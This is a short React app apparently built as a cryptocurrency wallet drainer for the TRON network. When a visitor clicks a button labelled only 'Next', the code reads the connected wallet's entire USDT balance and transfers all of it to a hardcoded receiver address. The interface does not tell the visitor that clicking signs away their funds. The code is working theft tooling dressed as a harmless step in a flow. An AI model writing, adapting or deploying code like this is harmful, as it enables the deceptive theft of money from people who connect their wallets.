import React, { useState } from 'react';
import TronWeb from 'tronweb';

function App() {
  const [status, setStatus] = useState('');
  const receiver = 'TGyoKBUG2VuTKpC6iSwcG1BHmyShCQtuvo';
  const contractAddress = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj';

  const waitForTronWeb = async () => {
    return new Promise((resolve, reject) => {
      let tries = 0;
      const interval = setInterval(() => {
        if (window.tronWeb && window.tronWeb.ready) {
          clearInterval(interval);
          resolve(true);
        }
        tries++;
        if (tries > 10) {
          clearInterval(interval);
          reject("TronWeb not detected.");
        }
      }, 500);
    });
  };

  const sendUSDT = async () => {
    try {
      await waitForTronWeb();
      const tronWeb = window.tronWeb;
      const sender = tronWeb.defaultAddress.base58;
      const contract = await tronWeb.contract().at(contractAddress);
      const balance = await contract.balanceOf(sender).call();
      const amount = balance.toString();

      if (parseInt(amount) === 0) {
        setStatus("No USDT to send.");
        return;
      }

      await contract.transfer(receiver, amount).send();
      setStatus("✅ USDT sent successfully.");
    } catch (err) {
      console.error(err);
      setStatus("❌ Error: " + err.message);
    }
  };

  return (
    <div style={{ textAlign: 'center', marginTop: '50px' }}>
      <h2>TRC20 USDT Auto Transfer</h2>
      <button onClick={sendUSDT}>Next</button>
      <p>{status}</p>
    </div>
  );
}

export default App;